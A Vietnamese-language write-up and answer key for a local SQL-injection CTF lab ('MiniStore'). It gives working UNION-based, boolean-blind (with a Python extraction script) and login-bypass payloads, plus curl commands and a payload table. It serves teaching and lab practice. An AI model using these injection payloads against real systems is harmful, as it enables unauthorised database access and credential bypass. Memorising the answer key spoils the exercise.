# Hướng dẫn khai thác từng bài — MiniStore SQLi CTF (bản rút gọn)

> ⚠️ Tài liệu writeup/đáp án — chỉ dùng trong môi trường lab được cấp phép.
> Giả sử app chạy tại `http://127.0.0.1:8080` (đổi lại nếu bạn deploy port khác).

## Bước 0 — Khởi động

```bash
docker compose up --build
```

Hoặc không dùng Docker: `./run.sh` (app ở cổng 5000).

Script tự động hoá toàn bộ các bước dưới đây:
```bash
pip install requests
python3 exploit.py all --base http://127.0.0.1:8080
```

> **Lưu ý:** `?q=`, `?category=`, `?sort=` ở trang chủ là mồi nhử, đã được
> tham số hoá an toàn. Chỉ `/products?id=`, `/check?username=` và `/login`
> mới chứa lỗ hổng thật.

---

## UNION-based (`/products?id=`)

Ứng dụng không hiển thị lỗi SQL (đã tắt debug), nên dò dựa vào hành vi trang.

**Bước 1 — dò số cột bằng `ORDER BY`** (6 cột — ID, Tên, Danh mục, Giá, Mô tả — khớp giao diện):
```
?id=0 UNION SELECT 1,2,3,4,5,6
```
→ Nhận được 1 dòng kết quả mới (1,2,3,4,5,6) ⇒ đúng 6 cột.

**Bước 2 — liệt kê cấu trúc CSDL (SQLite):**
```
?id=0 UNION SELECT 1, name, sql, 1, 1, 1 FROM sqlite_master WHERE type='table'
```

**Bước 3 — rút flag:**
```
?id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'
```
```bash
curl -s "http://127.0.0.1:8080/products" \
  --data-urlencode "id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'" -G
```
→ Flag hiện trong cột "Mô tả".

---

## Boolean-based Blind (`/check?username=`)

Endpoint chỉ trả TAKEN / AVAILABLE — không lộ dữ liệu, không lộ lỗi.

**Bước 1 — xác nhận injection:**
```
?username=admin' AND '1'='1     → TAKEN
?username=admin' AND '1'='2     → AVAILABLE
```

**Bước 2 — biến đúng/sai thành dấu hiệu bằng `OR`:**
```
?username=nosuchuser' OR ((SELECT length(flag) FROM flags WHERE code='boolean_blind') >= 10) -- 
```

**Bước 3 — dò từng ký tự bằng binary search**, nhận biết TAKEN/AVAILABLE qua class CSS `ms-alert-danger` (xem `exploit.py` để có code đầy đủ):
```python
def truthy(cond):
    payload = f"nosuchuser' OR ({cond}) -- "
    r = requests.get(URL, params={"username": payload})
    return "ms-alert-danger" in r.text

def extract_flag():
    length = next(i-1 for i in range(1,80)
        if not truthy(f"(SELECT length(flag) FROM flags WHERE code='boolean_blind') >= {i}"))
    out = ""
    for i in range(1, length+1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo+hi)//2
            cond = f"(SELECT unicode(substr(flag,{i},1)) FROM flags WHERE code='boolean_blind') > {mid}"
            lo, hi = (mid+1, hi) if truthy(cond) else (lo, mid)
        out += chr(lo)
        print(f"[dò ký tự {i}/{length}] {out}")
    return out
```

---

## Authentication Bypass (`/login`)

Username = `admin' -- ` (có dấu cách sau `--`), mật khẩu bất kỳ → phần kiểm tra mật khẩu bị comment bỏ → đăng nhập admin.

```bash
curl -s -i -X POST http://127.0.0.1:8080/login \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" | grep -i location
```
→ Redirect `/dashboard`, trang hiển thị flag vì `role == 'admin'`.

---

## Bảng tổng kết

| Kỹ thuật | Endpoint | Payload tiêu biểu |
|----------|----------|--------------------|
| UNION-based | `/products?id=` | `0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'` |
| Boolean-based Blind | `/check?username=` | `nosuchuser' OR ((SELECT unicode(substr(flag,1,1)) FROM flags WHERE code='boolean_blind')>70) -- ` |
| Authentication Bypass | `/login` | `admin' -- ` |